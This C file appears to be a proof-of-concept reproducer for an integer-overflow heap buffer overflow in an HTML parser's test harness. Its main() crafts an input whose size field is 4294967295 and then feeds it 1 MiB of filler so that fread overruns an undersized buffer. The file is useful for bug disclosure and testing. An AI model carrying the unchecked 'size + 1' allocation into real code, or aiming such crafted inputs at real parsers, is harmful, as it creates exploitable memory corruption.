#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>

/* Minimal stubs and types to satisfy the original function's dependencies */
#define ATTRIBUTE_UNUSED

typedef unsigned char xmlChar;
#define BAD_CAST (const xmlChar *)

/* Dummy tokenizer config used in the original test function */
typedef struct {
    unsigned dataState;
    const xmlChar *startTag;
    int inCharacters;
} xmlTokenizerConfig;

/* Dummy SAX handler and parser context to satisfy calls below */
typedef struct { int dummy; } xmlSAXHandler;
xmlSAXHandler tokenizeHtmlSAXHandler; /* referenced by address */

typedef struct _htmlParserCtxt {
    void *_private;
    int instate;
} *htmlParserCtxtPtr;

enum { XML_PARSER_XML_DECL = 0 };
#define HTML_PARSE_HTML5 0x1

typedef enum { XML_CHAR_ENCODING_UTF8 = 1 } xmlCharEncoding;

/* Minimal no-op stubs for parser API used after fread (unreached in our repro) */
static htmlParserCtxtPtr htmlCreatePushParserCtxt(xmlSAXHandler *sax, void *user, const char *chunk, int size, const char *filename, int enc) {
    (void)sax; (void)user; (void)chunk; (void)size; (void)filename; (void)enc;
    htmlParserCtxtPtr ctxt = (htmlParserCtxtPtr)malloc(sizeof(*ctxt));
    if (ctxt) { ctxt->_private = NULL; ctxt->instate = 0; }
    return ctxt;
}
static void htmlCtxtUseOptions(htmlParserCtxtPtr ctxt, int options) {
    (void)ctxt; (void)options;
}
static void htmlParseChunk(htmlParserCtxtPtr ctxt, const char *data, unsigned size, int terminate) {
    (void)ctxt; (void)data; (void)size; (void)terminate;
}
static void htmlFreeParserCtxt(htmlParserCtxtPtr ctxt) {
    free(ctxt);
}

/* xmlMalloc/xmlFree stubs; allocate at least 1 byte for size==0 to clearly show overflow */
static void *xmlMalloc(size_t size) {
    if (size == 0) size = 1; /* make the undersized allocation observable */
    void *p = malloc(size);
    if (!p) { perror("malloc"); exit(1); }
    return p;
}
static void xmlFree(void *p) { free(p); }

/* Other harness globals and helpers from runtest.c */
static FILE *SAXdebug = NULL;
static int nb_tests = 0;
static const char *temp_directory = ".";

static void fatalError(void) { exit(1); }

static char *resultFilename(const char *filename, const char *dir, const char *ext) {
    (void)filename; (void)dir; (void)ext;
    const char *name = "reproducer_output.res";
    char *out = (char *)xmlMalloc(strlen(name) + 1);
    strcpy(out, name);
    return out;
}

static int compareFiles(const char *a, const char *b) {
    (void)a; (void)b; return 0; /* Not reached in this reproducer */
}

/* Vulnerable function reproduced from the source (HTML part only relevant pieces). */
static int htmlTokenizerTest(const char *filename, const char *result, const char *err ATTRIBUTE_UNUSED, int options) {
    xmlTokenizerConfig config;
    char startTag[31];
    FILE *input;
    char *temp;
    unsigned testNum, dataState, size;
    int ret = 0, counter = 0;

    nb_tests++;
    temp = resultFilename(filename, temp_directory, ".res");
    if (temp == NULL) {
        fprintf(stderr, "out of memory\n");
        fatalError();
    }

    SAXdebug = fopen(temp, "wb");
    if (SAXdebug == NULL) {
        fprintf(stderr, "Failed to write to %s\n", temp);
        xmlFree(temp);
        return -1;
    }

    input = fopen(filename, "rb");
    if (input == NULL) {
        fprintf(stderr, "%s: failed to open\n", filename);
        return -1;
    }

    while (fscanf(input, "%u %30s %u %u%*1[\n]", &testNum, startTag, &dataState, &size) >= 4) {
        htmlParserCtxtPtr ctxt;
        char *data;

        fprintf(SAXdebug, "%d\n", counter++);

        /* BUG: integer overflow when size == 0xFFFFFFFF -> size + 1 wraps to 0 (unsigned 32-bit) */
        data = (char *)xmlMalloc(size + 1);

        /* This fread will attempt to write 'size' bytes into 'data', which is undersized. */
        if (fread(data, 1, size, input) != size) {
            fprintf(stderr, "%s:%d: unexpected eof\n", filename, counter);
            /* Overflow already occurred during fread; return to stop further processing */
            return -1;
        }

        /* Dead code in our reproducer; kept for fidelity */
        ctxt = htmlCreatePushParserCtxt(&tokenizeHtmlSAXHandler, NULL, NULL, 0, NULL, XML_CHAR_ENCODING_UTF8);
        config.dataState = dataState;
        config.startTag = BAD_CAST startTag;
        config.inCharacters = 0;
        ctxt->_private = &config;
        ctxt->instate = XML_PARSER_XML_DECL;
        htmlCtxtUseOptions(ctxt, options | HTML_PARSE_HTML5);
        htmlParseChunk(ctxt, data, size, 1);
        htmlFreeParserCtxt(ctxt);

        xmlFree(data);
    }

    if (!feof(input)) {
        fprintf(stderr, "%s:%d: invalid format\n", filename, counter);
        return -1;
    }

    fclose(input);
    fclose(SAXdebug);

    if (compareFiles(temp, result)) {
        fprintf(stderr, "Got a difference for %s\n", filename);
        ret = 1;
    }

    if (temp != NULL) {
        unlink(temp);
        xmlFree((void *)temp);
    }

    return ret;
}

int main(void) {
    const char *inpath = "repro_input.txt";
    FILE *f = fopen(inpath, "wb");
    if (!f) { perror("fopen"); return 1; }

    /* Craft a record where size = 4294967295 (UINT32_MAX). This makes size+1 wrap to 0. */
    fprintf(f, "1 tag 0 4294967295\n");

    /* Provide a payload to ensure fread writes many bytes into the tiny buffer. */
    const size_t payload = 1 << 20; /* 1 MiB is enough to trigger ASan */
    char *buf = (char *)malloc(payload);
    memset(buf, 'A', payload);
    fwrite(buf, 1, payload, f);
    free(buf);

    fclose(f);

    /* Call the vulnerable function. The overflow occurs during fread inside it. */
    (void)htmlTokenizerTest(inpath, "expected_unused.res", NULL, 0);

    return 0;
}
